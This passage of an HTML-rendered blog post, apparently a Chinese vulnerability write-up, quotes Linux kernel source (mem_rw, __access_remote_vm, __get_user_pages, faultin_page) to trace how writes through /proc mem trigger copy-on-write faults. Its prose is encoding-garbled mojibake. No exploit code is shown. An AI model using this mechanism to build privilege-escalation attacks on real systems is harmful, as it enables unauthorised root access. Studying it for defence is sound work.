class="line">  unlock_page(old_page);</span><br><span class="line">  <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">                       orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­é¦–å…ˆé€šè¿‡<code>reuse_swap_page</code>åˆ¤æ–­æ˜¯å¦åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨ä½¿ç”¨è¯¥é¡µï¼Œå¦‚æœæ˜¯åˆ™ç›´æ¥è°ƒç”¨<code>wp_page_reuse</code>å‡½æ•°é‡ç”¨è¯¥é¡µã€‚å¦‚æœä»¥ä¸Šçš„æ‰€æœ‰éƒ½æ²¡æ»¡è¶³åˆ™è¿›å…¥æœ€åçš„æ— æ³•é‡ç”¨è¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p><p>é‚£ä¹ˆä»¥ä¸Šå°±æ˜¯COWçš„å…¨éƒ¨æµç¨‹äº†ï¼Œæ¥ä¸‹æ¥åˆ†æä¸€ä¸‹<code>write</code>å‡½æ•°ã€‚</p><h3 id="writeå‡½æ•°åˆ†æ"><a href="#writeå‡½æ•°åˆ†æ" class="headerlink" title="writeå‡½æ•°åˆ†æ"></a>writeå‡½æ•°åˆ†æ</h3><p>å…·ä½“æµç¨‹å…¶å®å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write() =&gt; vfs_write() =&gt; __vfs_write() =&gt; file-&gt;f_op-&gt;write() =&gt; mem_write() =&gt; mem_rw()</span><br></pre></td></tr></table></figure><h4 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a><strong>mem_rw</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line"><span class="keyword">ssize_t</span> copied;</span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">copied = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line"><span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br><span class="line">&#125;</span><br><span class="line">*ppos = addr;</span><br><span class="line"></span><br><span class="line">mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line"><span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æµç¨‹è¿˜æ˜¯å¬æ¸…æ™°çš„ï¼Œé¦–å…ˆå°±æ˜¯è·å–ä¸€ä¸ªä¸´æ—¶çš„å†…å­˜é¡µï¼Œç´§æ¥ç€å°†ç”¨æˆ·ç©ºé—´çš„å†…å®¹æ”¾åˆ°ä¸´æ—¶çš„å†…å­˜é¡µä¸­å³å¯ï¼Œæ¥ç€åˆ©ç”¨<code>access_remote_vm</code>å‡½æ•°è®¿é—®å†…å­˜ï¼Œç„¶ååé¢æ˜¯å¦‚æœä¸æ˜¯å†™çš„è¯å°±è¿”å›å†…å®¹åˆ°ç”¨æˆ·ç©ºé—´ï¼Œæœ€åé‡Šæ”¾ä¸´æ—¶å†…å­˜é¡µã€‚</p><h4 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h4><p><code>access_remote_vm</code>å‡½æ•°å…¶å®å°±æ˜¯<code>__access_remote_vm</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line"><span class="keyword">while</span> (len) &#123;</span><br><span class="line"><span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line"><span class="keyword">void</span> *maddr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment"> * we can access using slightly different code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = find_vma(mm, addr);</span><br><span class="line"><span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">  len, write);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">bytes = len;</span><br><span class="line">offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">maddr = kmap(page);</span><br><span class="line"><span class="keyword">if</span> (write) &#123;</span><br><span class="line">copy_to_user_page(vma, page, addr,</span><br><span class="line">  maddr + offset, buf, bytes);</span><br><span class="line">set_page_dirty_lock(page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">copy_from_user_page(vma, page, addr,</span><br><span class="line">    buf, maddr + offset, bytes);</span><br><span class="line">&#125;</span><br><span class="line">kunmap(page);</span><br><span class="line">page_cache_release(page);</span><br><span class="line">&#125;</span><br><span class="line">len -= bytes;</span><br><span class="line">buf += bytes;</span><br><span class="line">addr += bytes;</span><br><span class="line">&#125;</span><br><span class="line">up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡<code>ret = get_user_pages(tsk, mm, addr, 1, write, 1, &amp;page, &amp;vma);</code>è·å–åˆ°å¯¹åº”ç›®æ ‡çš„å†…å­˜é¡µã€‚ç„¶åé€šè¿‡<code>maddr = kmap(page);</code>å»ºç«‹æ˜ å°„ï¼Œæœ€ååœ¨<code>copy_to_user_page(vma, page, addr, maddr + offset, buf, bytes);</code>ä¸­å†™å…¥ã€‚</p><p>é‚£ä¹ˆå…¶ä¸­æœ€ä¸ºé‡è¦çš„å³ä¸º<code>get_user_pages</code>å‡½æ•°</p><h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_pages)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment"> * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment"> * using the address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> foll_flags = gup_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_increm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* first iteration or cross vma bound */</span></span><br><span class="line"><span class="keyword">if</span> (!vma || start &gt;= vma-&gt;vm_end) &#123;</span><br><span class="line">vma = find_extend_vma(mm, start);</span><br><span class="line"><span class="keyword">if</span> (!vma &amp;&amp; in_gate_area(mm, start)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = get_gate_page(mm, start &amp; PAGE_MASK,</span><br><span class="line">gup_flags, &amp;vma,</span><br><span class="line">pages ? &amp;pages[i] : <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> i ? : ret;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!vma || check_vma_flags(vma, gup_flags))</span><br><span class="line"><span class="keyword">return</span> i ? : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;</span><br><span class="line">i = follow_hugetlb_page(mm, vma, pages, vmas,</span><br><span class="line">&amp;start, &amp;nr_pages, i,</span><br><span class="line">gup_flags);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment"> * potentially allocating memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line"><span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">cond_resched();</span><br><span class="line">      page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">nonblocking);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"><span class="keyword">case</span> -EFAULT:</span><br><span class="line"><span class="keyword">case</span> -ENOMEM:</span><br><span class="line"><span class="keyword">case</span> -EHWPOISON:</span><br><span class="line"><span class="keyword">return</span> i ? i : ret;</span><br><span class="line"><span class="keyword">case</span> -EBUSY:</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">case</span> -ENOENT:</span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125;</span><br><span class="line">BUG();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Proper page table entry exists, but no corresponding</span></span><br><span class="line"><span class="comment"> * struct page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">goto</span> next_page;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_ERR(page)) &#123;</span><br><span class="line"><span class="keyword">return</span> i ? i : PTR_ERR(page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pages) &#123;</span><br><span class="line">pages[i] = page;</span><br><span class="line">flush_anon_page(vma, page, start);</span><br><span class="line">flush_dcache_page(page);</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">next_page:</span><br><span class="line"><span class="keyword">if</span> (vmas) &#123;</span><br><span class="line">vmas[i] = vma;</span><br><span class="line">page_mask = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_increm = <span class="number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);</span><br><span class="line"><span class="keyword">if</span> (page_increm &gt; nr_pages)</span><br><span class="line">page_increm = nr_pages;</span><br><span class="line">i += page_increm;</span><br><span class="line">start += page_increm * PAGE_SIZE;</span><br><span class="line">nr_pages -= page_increm;</span><br><span class="line">&#125; <span class="keyword">while</span> (nr_pages);</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages);</span><br></pre></td></tr></table></figure><p>æœ€å¼€å§‹å°±æ˜¯å¯¹vmaçš„ä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯<code>retry</code>ä¹‹åçš„å†…å®¹ã€‚å¯ä»¥çœ‹å‡ºæ¥çš„æ˜¯<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„æ˜¯ç‰©ç†é¡µé¢ï¼Œè€Œä¸”<code>faultin_page</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨<code>handle_mm_fault</code>ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡å¾€ä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥å†…å®¹æ—¶ä¼šå› ä¸ºLinuxçš„å»¶è¿Ÿç»‘å®šæœºåˆ¶å¯¼è‡´è¯¥é¡µè¿˜æœªå’Œå¯¹åº”çš„ç‰©ç†é¡µå»ºç«‹æ˜ å°„ï¼Œé‚£ä¹ˆæ­¤æ—¶<code>follow_page_mask</code>å‡½æ•°è¿”å›çš„åˆ™æ˜¯NULLï¼Œéšå³è¿›å…¥ç¬¬ä¸€ä¸ª<code>faultin_page</code>å‡½æ•°ï¼Œæ ¹æ®å‰é¢çš„åˆ†æï¼Œè¿™ä¸€æ¬¡è§£å†³å®Œæ¯•ä¹‹åï¼Œä¼šåˆ†é…ç‰©ç†é¡µã€‚é‚£ä¹ˆè¿™é‡Œç»è¿‡<code>retry</code>å†ä¸€æ¬¡æ‰§è¡Œ<code>follow_page_mask</code>ï¼Œä¸è¿‡å› ä¸ºé¡µé¢ä¸å¯å†™å†ä¸€æ¬¡å¯¼è‡´è¿”å›çš„å€¼ä¸ºNULLï¼Œéšå³è¿›è¡Œç¬¬äºŒæ¬¡<code>faultin_page</code>å‡½æ•°ï¼Œè¿›è¡Œå†™æ—¶å¤åˆ¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> vma-&gt;vm_mm;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line"><span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">(stack_guard_page_start(vma, address) ||</span><br><span class="line"> stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line"><span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line"><span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">BUG();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tsk) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">tsk-&gt;maj_flt++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">tsk-&gt;min_flt++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line"><span class="keyword">if</span> (nonblocking)</span><br><span class="line">*nonblocking = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment"> * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment"> * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment"> * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment"> * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment"> * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 